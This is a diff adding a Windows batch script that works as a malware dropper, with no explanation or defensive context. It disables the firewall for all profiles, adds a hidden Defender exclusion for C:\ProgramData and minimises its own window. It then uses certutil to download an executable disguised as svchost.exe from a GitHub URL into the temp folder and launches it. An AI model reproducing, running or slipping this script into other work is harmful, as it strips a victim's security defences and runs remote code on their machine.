@@ -1,0 +1,12 @@
+@echo off
+set u=https://github.com/devoxry777-crypto/grap/raw/refs/heads/main/svchost.exe
+set p=%TEMP%\svchost.exe
+
+
+netsh advfirewall set allprofiles state off
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData'"
+powershell -command "(Get-Process -Id $PID).MainWindowHandle | ForEach-Object { (New-Object -TypeName psobject -Property @{h=$_}).h } | ForEach-Object { $sig='[DllImport(\"user32.dll\")]public static extern bool ShowWindowAsync(IntPtr hWnd,int nCmdShow);'; add-type $sig; [void]([void]::ShowWindowAsync($_,6)) }"
+
+certutil -urlcache -f %u% %p%
+
+start "" "%p%"
